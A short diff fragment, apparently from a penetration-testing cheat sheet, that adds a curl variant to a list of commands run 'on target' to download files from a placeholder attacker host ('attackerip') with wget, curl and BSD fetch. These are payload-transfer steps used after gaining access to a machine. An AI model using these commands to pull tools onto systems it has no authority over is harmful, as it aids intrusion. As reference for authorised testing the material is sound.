@@ -31,6 +31,7 @@ service apache2 start
 #on target
 wget http://attackerip/file
 curl http://attackerip/file > file
+curl http://attackerip/file -o file
 fetch http://attackerip/file        # on BSD
 
 ----------------------------------
